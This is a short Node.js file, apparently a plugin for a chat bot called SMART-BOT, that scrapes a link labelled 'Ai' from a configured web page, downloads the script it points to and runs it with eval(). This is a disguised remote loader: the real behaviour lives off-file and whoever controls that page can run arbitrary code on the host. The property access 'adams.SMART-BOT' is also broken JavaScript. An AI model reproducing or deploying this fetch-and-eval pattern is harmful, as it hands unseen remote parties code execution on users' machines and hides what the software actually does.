

//  [SMART-BOT EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Jay 0001                                    
//  >> Version: 8.3.5-smartbot.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchAiUrl() {
  try {
    const response = await axios.get(adams.SMART-BOT);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("Ai")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('Ai not found 😭');
    }

    console.log('Ai loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAiUrl();
